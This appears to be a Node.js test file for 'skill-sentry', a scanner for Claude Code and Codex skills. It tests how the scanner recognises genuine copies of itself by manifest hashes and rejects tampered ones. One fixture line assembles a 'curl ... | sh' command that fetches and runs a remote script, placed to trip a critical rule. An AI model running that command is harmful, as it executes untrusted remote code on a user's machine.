import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { tmpFactory, copyTree } from './helpers/tmp.mjs';
import { matchSelf, loadSelfManifest, markSkillSentryCopy, manifestByteCap, MANIFEST_REL } from '../skills/audit/scripts/lib/selfcopy.mjs';
import { KNOWN_RELEASES } from '../skills/audit/scripts/lib/releases.mjs';
import { roots } from '../skills/audit/scripts/lib/roots.mjs';
import { discover } from '../skills/audit/scripts/lib/inventory.mjs';
import { discoverCodex } from '../skills/audit/scripts/lib/codex/inventory.mjs';
import { scanComponent } from '../skills/audit/scripts/lib/scanner.mjs';
import { releaseEntry } from '../tools/release-hashes.mjs';

// Self-recognition through the self-manifest (skills/audit/scripts/lib/selfmanifest.json): the running scanner's own
// manifest vouches for plugin copies (the whole release tree) and standalone skill copies (its skills/audit subset).

const tmp = tmpFactory('ss-selfcopy-');
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const j = (...p) => p.join('');
const NO_RELEASES = { hashes: {}, sizes: {} };
const SKILL_MANIFEST = 'scripts/lib/selfmanifest.json';

/** Independent hashing (test-only): LF-normalised SHA-256 of every file under dir, relpaths `/`-separated. */
const lf = b => Buffer.from(b.toString('latin1').replace(/\r\n/g, '\n'), 'latin1');
const sha = b => crypto.createHash('sha256').update(lf(b)).digest('hex');
function hashTree(dir, skip = new Set()) {
  const out = {};
  const walk = rel => {
    for (const e of fs.readdirSync(path.join(dir, rel), { withFileTypes: true })) {
      const r = rel ? `${rel}/${e.name}` : e.name;
      if (skip.has(r)) continue;
      if (e.isDirectory()) walk(r);
      else out[r] = sha(fs.readFileSync(path.join(dir, r)));
    }
  };
  walk('');
  return out;
}
const write = (dir, rel, body) => {
  fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
  fs.writeFileSync(path.join(dir, rel), body);
};

/**
 * A fake release tree (plugin layout) whose rule file trips a critical rule when scanned (fragment-assembled),
 * with its selfmanifest.json written over every other file. Returns { dir, manifest } (manifest as loaded).
 */
function buildRelease(dir, { version = '9.9.9', extra = {} } = {}) {
  const files = {
    '.claude-plugin/plugin.json': JSON.stringify({ name: 'skill-sentry', version }),
    'hooks/hooks.json': JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'node "${CLAUDE_PLUGIN_ROOT}/skills/audit/scripts/guard.mjs"' }] }] } }),
    'CHANGELOG.md': `# Changelog\n\n## ${version}\n`,
    'package.json': JSON.stringify({ name: 'skill-sentry', version }),
    'skills/audit/SKILL.md': '---\nname: audit\ndescription: audit\n---\nRun the scanner.\n',
    'skills/audit/scripts/scan.mjs': '// scan\n',
    'skills/audit/scripts/guard.mjs': '// guard\n',
    'skills/audit/scripts/harden.mjs': '// harden\n',
    'skills/audit/scripts/lib/rules.mjs': `// pattern example: ${j('cu', 'rl')} -s https://x.io/i.sh${j(' | ', 's', 'h')}\n`,
    'skills/harden/SKILL.md': '---\nname: harden\ndescription: harden\n---\nHarden.\n',
    ...extra,
  };
  for (const [rel, body] of Object.entries(files)) write(dir, rel, body);
  const hashes = hashTree(dir);
  const sorted = Object.fromEntries(Object.keys(hashes).sort().map(k => [k, hashes[k]]));
  write(dir, MANIFEST_REL, `${JSON.stringify({ version, files: sorted }, null, 2)}\n`);
  return { dir, manifest: loadSelfManifest(path.join(dir, ...MANIFEST_REL.split('/'))) };
}
/** A running scanner whose own tree differs from the release (a dev checkout with local edits). */
const devTree = () => buildRelease(tmp('dev'), { version: '9.9.9', extra: { 'skills/audit/scripts/lib/dev.mjs': '// local edit\n' } }).dir;

const skillCopy = (rel, at = path.join(tmp('home'), '.claude', 'skills', 'skill-sentry-audit')) => {
  copyTree(path.join(rel, 'skills', 'audit'), at);
  return at;
};
const pluginCopy = rel => {
  const at = path.join(tmp('home'), '.claude', 'plugins', 'cache', 'skill-sentry', 'skill-sentry', '9.9.9');
  copyTree(rel, at);
  return at;
};

test('loadSelfManifest: a valid manifest loads with the hash of its own bytes; anything else is null and never throws', () => {
  const { dir, manifest } = buildRelease(tmp('rel'));
  assert.equal(manifest.version, '9.9.9');
  assert.equal(manifest.sha, sha(fs.readFileSync(path.join(dir, ...MANIFEST_REL.split('/')))));
  assert.ok(!Object.hasOwn(manifest.files, MANIFEST_REL), 'the manifest never lists itself');
  const bad = tmp('bad');
  for (const [label, body] of [
    ['not json', '{'],
    ['no version', JSON.stringify({ files: {} })],
    ['bad hash', JSON.stringify({ version: '1.0.0', files: { 'a.md': 'xyz' } })],
    ['dotdot path', JSON.stringify({ version: '1.0.0', files: { '../a.md': 'a'.repeat(64) } })],
    ['absolute path', JSON.stringify({ version: '1.0.0', files: { '/a.md': 'a'.repeat(64) } })],
    ['backslash path', JSON.stringify({ version: '1.0.0', files: { 'a\\b.md': 'a'.repeat(64) } })],
    ['array', '[]'],
  ]) {
    fs.writeFileSync(path.join(bad, 'm.json'), body);
    assert.equal(loadSelfManifest(path.join(bad, 'm.json')), null, label);
  }
  assert.equal(loadSelfManifest(path.join(bad, 'missing.json')), null, 'missing');
  // The committed manifest (the last release's) loads.
  assert.ok(loadSelfManifest(), 'the running scanner carries a loadable selfmanifest.json');
});

test('a standalone skill copy matching the manifest subset is self', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const self = devTree();
  const opts = { selfRoot: self, selfManifest: manifest, releases: NO_RELEASES };
  const copy = skillCopy(rel);
  assert.deepEqual(matchSelf(copy, 'skill', opts), { self: true, version: '9.9.9', via: 'manifest' });
  assert.equal(matchSelf(copy, 'plugin', opts).self, false, 'a skill dir is not a plugin copy');
  // CRLF line ends (a git autocrlf checkout) are the same file.
  const crlf = skillCopy(rel, path.join(tmp('crlf'), 'skill-sentry'));
  const f = path.join(crlf, 'SKILL.md');
  fs.writeFileSync(f, fs.readFileSync(f, 'utf8').replace(/\n/g, '\r\n'));
  assert.equal(matchSelf(crlf, 'skill', opts).self, true, 'CRLF');

  // Inventory: Claude (~/.claude/skills/<name>, project .claude/skills/<name>) and Codex (~/.agents/skills/<name>).
  const claudeHome = path.dirname(path.dirname(copy));
  const project = tmp('proj');
  skillCopy(rel, path.join(project, '.claude', 'skills', 'skill-sentry'));
  const inv = discover({ claudeHome, homeDir: tmp('hd'), projectDir: project, selfRoot: self, selfManifest: manifest, releases: NO_RELEASES });
  const skills = inv.components.filter(c => c.kind === 'skill');
  assert.deepEqual(skills.map(c => [c.id, c.self === true]).sort(), [['skill:project:skill-sentry', true], ['skill:user:skill-sentry-audit', true]]);
  for (const c of skills) {
    const r = scanComponent(c);
    assert.equal(r.findings.filter(x => x.severity === 'critical').length, 0, c.id);
    assert.equal(r.findings.filter(x => x.ruleId === 'SKILL_SENTRY_OLD_VERSION').length, 0, 'same version: no notice');
  }
  const userHome = tmp('uh');
  fs.mkdirSync(path.join(userHome, '.codex'));
  skillCopy(rel, path.join(userHome, '.agents', 'skills', 'skill-sentry'));
  const cx = discoverCodex({ homes: [{ label: 'h0', root: path.join(userHome, '.codex'), userHome }], projectDir: null, selfRoot: self, selfManifest: manifest, releases: NO_RELEASES });
  const cs = cx.components.find(c => c.kind === 'skill' && c.name === 'skill-sentry');
  assert.equal(cs.self, true);
});

test('final review M3: a skill copy missing a file the copy check requires still gets the manifest check', () => {
  // A manifest whose skills/audit subset has no scripts/guard.mjs (which the copy check requires): before the fix the
  // missing file threw inside the copy check and the manifest was never consulted.
  const self = devTree();
  const copy = path.join(tmp('m3'), '.agents', 'skills', 'skill-sentry-audit');
  write(copy, 'SKILL.md', '---\nname: skill-sentry-audit\ndescription: audit\n---\nRun.\n');
  write(copy, 'scripts/scan.mjs', '// scan\n');
  const files = hashTree(copy);
  const body = `${JSON.stringify({ version: '9.9.9', files: Object.fromEntries(Object.entries(files).map(([k, v]) => [`skills/audit/${k}`, v]).sort()) }, null, 2)}\n`;
  write(copy, SKILL_MANIFEST, body);
  const manifest = loadSelfManifest(path.join(copy, ...SKILL_MANIFEST.split('/')));
  assert.ok(manifest);
  assert.deepEqual(matchSelf(copy, 'skill', { selfRoot: self, selfManifest: manifest, releases: NO_RELEASES }), { self: true, version: '9.9.9', via: 'manifest' });
});

test('final review M2: the manifest check reads no more than about twice the running tree', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const self = buildRelease(tmp('self')).dir;
  const expected = new Map(Object.entries(manifest.files).filter(([k]) => k.startsWith('skills/audit/')).map(([k, v]) => [k.slice('skills/audit/'.length), v]));
  const known = [...expected.keys()].reduce((a, k) => a + fs.statSync(path.join(self, 'skills', 'audit', ...k.split('/'))).size, 0);
  assert.equal(manifestByteCap(expected, path.join(self, 'skills', 'audit')), 2 * known, 'every file known: twice its running size');
  // A file the running tree lacks gets a fixed allowance (larger than any shipped file), not the 64 MB copy limit.
  const cap = manifestByteCap(new Map([...expected, ['scripts/lib/new.mjs', 'x']]), path.join(self, 'skills', 'audit'));
  assert.ok(cap > 2 * known && cap <= 2 * known + 1024 * 1024, String(cap));
  // An oversized file at an allowed path is refused before it is read.
  const copy = skillCopy(rel);
  fs.writeFileSync(path.join(copy, 'scripts', 'scan.mjs'), Buffer.alloc(2 * known + 4096, 0x20));
  assert.equal(matchSelf(copy, 'skill', { selfRoot: self, selfManifest: manifest, releases: NO_RELEASES }).self, false);
});

test('final review I1: the guard\'s standalone verifier exists only for standalone-shaped commands, verifies content, and is capped', async () => {
  const { standaloneVerifier, VERIFY_BUDGET_MS } = await import('../skills/audit/scripts/lib/selfverify.mjs');
  assert.ok(VERIFY_BUDGET_MS <= 250);
  for (const command of ['git status', 'node scan.mjs --json', `cat ${path.join(ROOT, 'skills', 'audit', 'SKILL.md')}`, null]) {
    assert.equal(await standaloneVerifier(command, ROOT), null, String(command));
  }
  const home = tmp('sv');
  const good = path.join(home, '.agents', 'skills', 'skill-sentry-audit');
  copyTree(path.join(ROOT, 'skills', 'audit'), good);
  const bad = path.join(home, '.agents', 'skills', 'evil-skill-sentry');
  copyTree(path.join(ROOT, 'skills', 'audit'), bad);
  fs.appendFileSync(path.join(bad, 'SKILL.md'), '\nextra\n');
  const command = `node "${good.replace(/\\/g, '/')}/scripts/scan.mjs" --json`;
  const v = await standaloneVerifier(command, ROOT, { deadline: Date.now() + 10_000 });
  assert.equal(v(good), true);
  assert.equal(v(bad), false);
  assert.equal(v(path.join(home, 'missing')), false);
  // Past the budget nothing is verified (fail closed), even a good copy.
  let t = 0;
  const late = await standaloneVerifier(command, ROOT, { now: () => (t += 1000) });
  assert.equal(late(good), false);
});

test('a plugin copy matching the manifest is self', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const self = devTree();
  const opts = { selfRoot: self, selfManifest: manifest, releases: NO_RELEASES };
  const copy = pluginCopy(rel);
  assert.deepEqual(matchSelf(copy, 'plugin', opts), { self: true, version: '9.9.9', via: 'manifest' });
  // Install markers (Claude Code `.in_use/<pid>`, Codex's marketplace marker) and a Codex clone's `.git` are left out.
  write(copy, '.in_use/31700', JSON.stringify({ pid: 31700, procStartFt: '134080000000000000' }));
  write(copy, '.git/HEAD', 'ref: refs/heads/main\n');
  write(copy, '.codex-marketplace-install.json', JSON.stringify({
    source_type: 'git', source: 'https://github.com/o/skill-sentry.git', ref_name: null, sparse_paths: [], revision: 'a'.repeat(40),
  }, null, 2));
  assert.equal(matchSelf(copy, 'plugin', opts).self, true, 'markers and .git');

  const claudeHome = path.join(tmp('ch'), '.claude');
  const installPath = path.join(claudeHome, 'plugins', 'cache', 'skill-sentry', 'skill-sentry', '9.9.9');
  copyTree(rel, installPath);
  write(claudeHome, 'plugins/installed_plugins.json', JSON.stringify({
    version: 2, plugins: { 'skill-sentry@skill-sentry': [{ scope: 'user', installPath, version: '9.9.9' }] },
  }));
  const comp = discover({ claudeHome, homeDir: tmp('hd'), projectDir: null, selfRoot: self, selfManifest: manifest, releases: NO_RELEASES })
    .components.find(c => c.kind === 'plugin');
  assert.equal(comp.self, true);
  assert.equal(comp.meta.knownRelease, undefined, 'the running version: no older-version notice');
});

/** Mutations that must each make a copy unrecognised. `base` is the copy root, `rel` the release tree it came from. */
function mutations(kind) {
  const sub = kind === 'skill' ? '' : 'skills/audit/';
  const at = (base, r) => path.join(base, ...`${sub}${r}`.split('/'));
  return [
    ['one extra file', base => write(base, `${sub}scripts/lib/extra.mjs`, '// added\n')],
    ['one changed byte', base => {
      const f = at(base, 'scripts/guard.mjs');
      const b = fs.readFileSync(f);
      b[3] ^= 1;
      fs.writeFileSync(f, b);
    }],
    ['a missing file', base => fs.rmSync(at(base, 'scripts/harden.mjs'))],
    ['a missing selfmanifest.json', base => fs.rmSync(at(base, SKILL_MANIFEST))],
    ['a symlinked file', (base, rel) => {
      // A file symlink needs a privilege on Windows: fall back to a directory junction (also a link).
      const src = path.join(rel, 'skills', 'audit', 'scripts', 'lib');
      try {
        fs.rmSync(at(base, 'scripts/lib/rules.mjs'));
        fs.symlinkSync(path.join(src, 'rules.mjs'), at(base, 'scripts/lib/rules.mjs'), 'file');
      } catch {
        fs.rmSync(at(base, 'scripts/lib'), { recursive: true, force: true });
        fs.symlinkSync(src, at(base, 'scripts/lib'), 'junction');
      }
    }],
    ['code under .in_use', base => write(base, `${sub}.in_use/run.mjs`, '// x\n')],
  ];
}

test('one extra file, one changed byte, a symlinked file, a missing file → not self', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const self = devTree();
  const opts = { selfRoot: self, selfManifest: manifest, releases: NO_RELEASES };
  for (const kind of ['skill', 'plugin']) {
    for (const [label, mutate] of mutations(kind)) {
      const copy = kind === 'skill' ? skillCopy(rel) : pluginCopy(rel);
      mutate(copy, rel);
      assert.equal(matchSelf(copy, kind, opts).self, false, `${kind}: ${label}`);
    }
  }
  // Still scanned as usual: the rule file's pattern is reported.
  const copy = skillCopy(rel);
  write(copy, 'scripts/lib/extra.mjs', '// added\n');
  const claudeHome = path.dirname(path.dirname(copy));
  const comp = discover({ claudeHome, homeDir: tmp('hd'), projectDir: null, selfRoot: self, selfManifest: manifest, releases: NO_RELEASES })
    .components.find(c => c.kind === 'skill');
  assert.ok(!comp.self);
  assert.ok(scanComponent(comp).findings.some(f => f.severity === 'critical'), 'scanned as a third-party skill');
});

test('a standalone copy carrying a .git or node_modules dir is not self (Review Focus 2)', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const opts = { selfRoot: devTree(), selfManifest: manifest, releases: NO_RELEASES };
  for (const extra of ['.git/HEAD', 'node_modules/x/index.js']) {
    const copy = skillCopy(rel);
    write(copy, extra, 'x\n');
    assert.equal(matchSelf(copy, 'skill', opts).self, false, extra);
  }
});

test('a copy carrying its own selfmanifest.json with other hashes is not trusted', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const opts = { selfRoot: devTree(), selfManifest: manifest, releases: NO_RELEASES };
  for (const kind of ['skill', 'plugin']) {
    const copy = kind === 'skill' ? skillCopy(rel) : pluginCopy(rel);
    const base = kind === 'skill' ? copy : path.join(copy, 'skills', 'audit');
    // A payload added, and the copy's own manifest rewritten to vouch for it.
    write(base, 'scripts/lib/payload.mjs', '// payload\n');
    const own = path.join(base, ...SKILL_MANIFEST.split('/'));
    const m = JSON.parse(fs.readFileSync(own, 'utf8'));
    m.files[`skills/audit/scripts/lib/payload.mjs`] = sha(Buffer.from('// payload\n'));
    fs.writeFileSync(own, `${JSON.stringify(m, null, 2)}\n`);
    assert.equal(matchSelf(copy, kind, opts).self, false, `${kind}: rewritten manifest`);
  }
  // A copy identical except for one byte of its selfmanifest.json is not self either.
  const copy = skillCopy(rel);
  const own = path.join(copy, ...SKILL_MANIFEST.split('/'));
  fs.writeFileSync(own, fs.readFileSync(own, 'utf8').replace('9.9.9', '9.9.8'));
  assert.equal(matchSelf(copy, 'skill', opts).self, false, 'manifest bytes differ');
});

test('a dev tree that differs from the manifest still recognises installed copies of the manifest version', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const self = devTree();
  const opts = { selfRoot: self, selfManifest: manifest, releases: NO_RELEASES };
  assert.equal(matchSelf(pluginCopy(rel), 'plugin', opts).via, 'manifest');
  assert.equal(matchSelf(skillCopy(rel), 'skill', opts).via, 'manifest');
  // The dev tree itself, and copies of the dev tree, are self through the running bytes.
  assert.equal(matchSelf(self, 'plugin', opts).via, 'path');
  assert.equal(matchSelf(path.join(self, 'skills', 'audit'), 'skill', opts).via, 'path');
  assert.equal(matchSelf(pluginCopy(self), 'plugin', opts).via, 'copy');
  assert.equal(matchSelf(skillCopy(self), 'skill', opts).via, 'copy');
  // No manifest at all (or an empty one): nothing crashes, and only the running bytes vouch.
  for (const selfManifest of [null, { version: '9.9.9', files: {}, sha: 'a'.repeat(64) }]) {
    assert.equal(matchSelf(pluginCopy(rel), 'plugin', { ...opts, selfManifest }).self, false);
    assert.equal(matchSelf(skillCopy(self), 'skill', { ...opts, selfManifest }).via, 'copy');
  }
  // A standalone running scanner (selfRoot = its skill dir) recognises its own dir, copies of it and the release.
  const standalone = skillCopy(rel, path.join(tmp('sa'), 'skill-sentry'));
  const sopts = { ...opts, selfRoot: standalone };
  assert.equal(matchSelf(standalone, 'skill', sopts).via, 'path');
  assert.equal(matchSelf(pluginCopy(rel), 'plugin', sopts).via, 'manifest');
  assert.equal(matchSelf(skillCopy(rel), 'skill', { ...sopts, selfManifest: null }).via, 'copy');
});

test('a standalone running scanner recognises a same-version git plugin install (markers and .git) through the manifest (Review Focus 3)', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const standalone = skillCopy(rel, path.join(tmp('sa'), '.agents', 'skills', 'skill-sentry'));
  write(standalone, 'scripts/lib/local.mjs', '// differs from the release: only the manifest can vouch\n');
  const copy = pluginCopy(rel);
  write(copy, '.in_use/31700', JSON.stringify({ pid: 31700, procStartFt: '134080000000000000' }));
  write(copy, '.git/HEAD', 'ref: refs/heads/main\n');
  write(copy, '.codex-marketplace-install.json', JSON.stringify({
    source_type: 'git', source: 'https://github.com/o/skill-sentry.git', ref_name: null, sparse_paths: [], revision: 'b'.repeat(40),
  }, null, 2));
  assert.deepEqual(matchSelf(copy, 'plugin', { selfRoot: standalone, selfManifest: manifest, releases: NO_RELEASES }), { self: true, version: '9.9.9', via: 'manifest' });
});

test('a skills-dir entry that links to a matching copy is recognised (the skills CLI may install by linking)', t => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const canonical = skillCopy(rel, path.join(tmp('agents'), '.agents', 'skills', 'skill-sentry'));
  const claudeHome = path.join(tmp('home'), '.claude');
  const link = path.join(claudeHome, 'skills', 'skill-sentry');
  fs.mkdirSync(path.dirname(link), { recursive: true });
  try {
    fs.symlinkSync(canonical, link, 'junction');
  } catch (e) {
    t.skip(`cannot create a directory link here: ${e.code}`);
    return;
  }
  const comp = discover({ claudeHome, homeDir: tmp('hd'), projectDir: null, selfRoot: devTree(), selfManifest: manifest, releases: NO_RELEASES })
    .components.find(c => c.kind === 'skill');
  assert.equal(comp.root, link);
  assert.equal(comp.self, true);
});

function exportTag(tag) {
  const out = tmp('export');
  const a = spawnSync('git', ['-C', ROOT, 'archive', '--format=tar', tag], { maxBuffer: 256 * 1024 * 1024 });
  if (a.status !== 0) return null;
  const x = spawnSync('tar', ['-xf', '-'], { input: a.stdout, cwd: out, encoding: 'utf8' });
  return x.status === 0 ? out : null;
}

test('0.1.0–0.1.2 plugin trees are still recognised via KNOWN_RELEASES', t => {
  const exported = ['v0.1.0', 'v0.1.1', 'v0.1.2'].map(tag => [tag, exportTag(tag)]);
  if (exported.some(([, d]) => d === null)) {
    t.skip('git archive of the v0.1.x tags unavailable (run git fetch --tags)');
    return;
  }
  const self = devTree();
  // A release not yet in the embedded table (0.1.2 until the next release commit records it) is checked against the
  // entry tools/ci/record-release.mjs will write; recorded ones against the embedded table itself.
  const hashes = {};
  const sizes = {};
  for (const [tag, dir] of exported) {
    const e = releaseEntry(dir);
    hashes[tag.slice(1)] = e.hashes;
    sizes[tag.slice(1)] = e.sizes;
  }
  for (const [tag, dir] of exported) {
    const v = tag.slice(1);
    const embedded = Object.hasOwn(KNOWN_RELEASES, v);
    const r = matchSelf(dir, 'plugin', { selfRoot: self, selfManifest: null, ...(embedded ? {} : { releases: { hashes, sizes } }) });
    assert.deepEqual(r, { self: true, version: v, via: 'release' }, `${tag} (${embedded ? 'embedded table' : 'entry to be recorded'})`);
    // No standalone skill copy of a 0.1.x release exists: its skills/audit subset is only a SKILL.md.
    assert.equal(matchSelf(path.join(dir, 'skills', 'audit'), 'skill', { selfRoot: self, selfManifest: null, releases: { hashes, sizes } }).self, false, `${tag} skill subset`);
    const comp = { id: 'plugin:skill-sentry@skill-sentry', kind: 'plugin', name: 'skill-sentry@skill-sentry', root: dir, meta: {} };
    markSkillSentryCopy(comp, dir, self, { selfManifest: null, releases: { hashes, sizes } });
    assert.equal(comp.meta.knownRelease, v, tag);
    assert.ok(scanComponent(comp).findings.some(f => f.ruleId === 'SKILL_SENTRY_OLD_VERSION'), `${tag}: older-version notice`);
  }
});

test('an older standalone copy of a recorded 0.2.0+ release is self and gets the older-version notice', () => {
  const { dir: old } = buildRelease(tmp('old'), { version: '0.0.9' });
  const e = releaseEntry(old);
  const releases = { hashes: { '0.0.9': e.hashes }, sizes: { '0.0.9': e.sizes } };
  const { manifest } = buildRelease(tmp('rel'));
  const self = devTree();
  const copy = skillCopy(old);
  assert.deepEqual(matchSelf(copy, 'skill', { selfRoot: self, selfManifest: manifest, releases }), { self: true, version: '0.0.9', via: 'release' });
  const claudeHome = path.dirname(path.dirname(copy));
  const comp = discover({ claudeHome, homeDir: tmp('hd'), projectDir: null, selfRoot: self, selfManifest: manifest, releases })
    .components.find(c => c.kind === 'skill');
  assert.equal(comp.self, true);
  assert.equal(comp.meta.knownRelease, '0.0.9');
  assert.ok(scanComponent(comp).findings.some(f => f.ruleId === 'SKILL_SENTRY_OLD_VERSION'));
  // A skill dir holding only a recorded release's SKILL.md (the 0.1.x shape) is never self.
  const lone = path.join(tmp('lone'), 'skill-sentry');
  copyTree(path.join(old, 'skills', 'audit', 'SKILL.md'), path.join(lone, 'SKILL.md'));
  assert.equal(matchSelf(lone, 'skill', { selfRoot: self, selfManifest: manifest, releases }).self, false);
});

test('a skill dir not named *skill-sentry* is never checked', () => {
  const { dir: rel, manifest } = buildRelease(tmp('rel'));
  const self = devTree();
  const home = tmp('home');
  const claudeHome = path.join(home, '.claude');
  skillCopy(rel, path.join(claudeHome, 'skills', 'audit'));
  skillCopy(rel, path.join(claudeHome, 'skills', 'sentry'));
  const inv = discover({ claudeHome, homeDir: tmp('hd'), projectDir: null, selfRoot: self, selfManifest: manifest, releases: NO_RELEASES });
  for (const c of inv.components.filter(x => x.kind === 'skill')) {
    assert.ok(!c.self, c.id);
    assert.ok(scanComponent(c).findings.some(f => f.severity === 'critical'), `${c.id} scanned as usual`);
  }
  skillCopy(rel, path.join(home, '.agents', 'skills', 'audit'));
  fs.mkdirSync(path.join(home, '.codex'));
  const cx = discoverCodex({ homes: [{ label: 'h0', root: path.join(home, '.codex'), userHome: home }], projectDir: null, selfRoot: self, selfManifest: manifest, releases: NO_RELEASES });
  assert.ok(!cx.components.find(c => c.kind === 'skill' && c.name === 'audit').self);
});

test('roots: a grandparent plugin.json that is not skill-sentry, or a skill dir not at skills/audit, is standalone', () => {
  const entry = dir => {
    write(dir, 'scripts/scan.mjs', '// scan\n');
    return pathToFileURL(path.join(dir, 'scripts', 'scan.mjs')).href;
  };
  const other = tmp('other');
  write(other, '.claude-plugin/plugin.json', JSON.stringify({ name: 'other-plugin' }));
  assert.equal(roots(entry(path.join(other, 'skills', 'audit'))).pluginRoot, null, 'another plugin');
  const named = tmp('named');
  write(named, '.claude-plugin/plugin.json', JSON.stringify({ name: 'skill-sentry' }));
  assert.equal(roots(entry(path.join(named, 'skills', 'skill-sentry'))).pluginRoot, null, 'not skills/audit');
  const broken = tmp('broken');
  write(broken, '.claude-plugin/plugin.json', '{');
  assert.equal(roots(entry(path.join(broken, 'skills', 'audit'))).pluginRoot, null, 'unreadable plugin.json');
  const sa = path.join(tmp('sa'), 'skills', 'skill-sentry');
  const r = roots(entry(sa));
  assert.deepEqual(r, { skillRoot: sa, pluginRoot: null });
  const real = roots(pathToFileURL(path.join(ROOT, 'skills', 'audit', 'scripts', 'scan.mjs')).href);
  assert.equal(real.pluginRoot, ROOT, 'the repository is the plugin root');
  assert.equal(real.skillRoot, path.join(ROOT, 'skills', 'audit'));
  const ok = tmp('ok');
  write(ok, '.claude-plugin/plugin.json', JSON.stringify({ name: 'skill-sentry' }));
  assert.equal(roots(entry(path.join(ok, 'skills', 'audit'))).pluginRoot, ok);
});

const WRITE_MANIFEST = path.join(ROOT, 'tools', 'ci', 'write-manifest.mjs');
const runWriter = (...args) => spawnSync(process.execPath, [WRITE_MANIFEST, ...args], { encoding: 'utf8' });

test('write-manifest: an exported tree gets a sorted LF manifest of every file but itself and install markers; --verify catches any change', () => {
  const { dir } = buildRelease(tmp('rel'), { version: '1.2.3' });
  fs.rmSync(path.join(dir, ...MANIFEST_REL.split('/')));
  write(dir, '.in_use/4242', JSON.stringify({ pid: 4242, procStartFt: '134080000000000000' }));
  const crlf = path.join(dir, 'CHANGELOG.md');
  fs.writeFileSync(crlf, fs.readFileSync(crlf, 'utf8').replace(/\n/g, '\r\n'));
  let r = runWriter(dir);
  assert.equal(r.status, 0, r.stderr);
  const file = path.join(dir, ...MANIFEST_REL.split('/'));
  const text = fs.readFileSync(file, 'utf8');
  assert.ok(text.endsWith('}\n') && !text.includes('\r'), 'LF with a trailing newline');
  const m = JSON.parse(text);
  assert.deepEqual(Object.keys(m), ['version', 'files']);
  assert.equal(m.version, '1.2.3', 'version from package.json');
  const expected = hashTree(dir, new Set([MANIFEST_REL, '.in_use']));
  assert.deepEqual(m.files, expected);
  assert.deepEqual(Object.keys(m.files), Object.keys(m.files).slice().sort(), 'sorted keys');
  // Deterministic: writing again gives the same bytes.
  assert.equal(runWriter(dir).status, 0);
  assert.equal(fs.readFileSync(file, 'utf8'), text);
  r = runWriter(dir, '--verify');
  assert.equal(r.status, 0, r.stderr);
  // The written manifest vouches for that tree as a plugin and its skills/audit as a standalone skill.
  const manifest = loadSelfManifest(file);
  const opts = { selfRoot: devTree(), selfManifest: manifest, releases: NO_RELEASES };
  assert.equal(matchSelf(pluginCopy(dir), 'plugin', opts).via, 'manifest');
  assert.equal(matchSelf(skillCopy(dir), 'skill', opts).via, 'manifest');
  for (const [label, mutate] of [
    ['changed file', () => fs.appendFileSync(path.join(dir, 'README.md'), 'x')],
    ['added file', () => write(dir, 'skills/audit/scripts/lib/new.mjs', '// new\n')],
    ['edited manifest', () => fs.writeFileSync(file, text.replace('1.2.3', '1.2.4'))],
  ]) {
    write(dir, 'README.md', '# readme\n');
    assert.equal(runWriter(dir).status, 0);
    assert.equal(runWriter(dir, '--verify').status, 0, `${label}: before`);
    mutate();
    r = runWriter(dir, '--verify');
    assert.equal(r.status, 1, `${label}: ${r.stdout}${r.stderr}`);
    fs.rmSync(path.join(dir, 'skills', 'audit', 'scripts', 'lib', 'new.mjs'), { force: true });
  }
});

test('write-manifest: in a git work tree only tracked files are listed (ignored and untracked files are not released)', t => {
  const repo = tmp('git');
  const git = (...a) => spawnSync('git', ['-C', repo, ...a], { encoding: 'utf8' });
  if (git('init', '-q').status !== 0) {
    t.skip('git unavailable');
    return;
  }
  buildRelease(repo, { version: '2.0.0' });
  write(repo, '.gitignore', 'node_modules/\n');
  assert.equal(git('add', '-A').status, 0);
  write(repo, 'node_modules/x/index.js', '// ignored\n');
  write(repo, 'tools/ci/release/node_modules/y.js', '// ignored\n');
  write(repo, 'scratch.txt', 'untracked\n');
  const r = runWriter(repo);
  assert.equal(r.status, 0, r.stderr);
  const m = JSON.parse(fs.readFileSync(path.join(repo, ...MANIFEST_REL.split('/')), 'utf8'));
  const tracked = hashTree(repo, new Set(['.git', 'node_modules', 'tools', 'scratch.txt', MANIFEST_REL]));
  assert.deepEqual(m.files, tracked);
  assert.equal(runWriter(repo, '--verify').status, 0);
});

test('scan.mjs runs from a standalone skill copy (no package.json) and reports the manifest version', () => {
  const sa = path.join(tmp('sa'), '.claude', 'skills', 'skill-sentry-audit');
  copyTree(path.join(ROOT, 'skills', 'audit'), sa);
  const home = tmp('home');
  const r = spawnSync(process.execPath, [path.join(sa, 'scripts', 'scan.mjs'), '--json'], {
    encoding: 'utf8', cwd: home, env: {
      ...process.env, SKILL_SENTRY_DATA_DIR: path.join(tmp('data'), 'skill-sentry'), SKILL_SENTRY_CLAUDE_HOME: path.join(home, '.claude'),
      SKILL_SENTRY_HOME_DIR: home, SKILL_SENTRY_CODEX_HOME: path.join(home, '.codex'), SKILL_SENTRY_NO_WSL: '1',
    },
  });
  assert.equal(r.status, 0, r.stderr);
  const report = JSON.parse(r.stdout);
  assert.equal(report.version, loadSelfManifest().version);
});
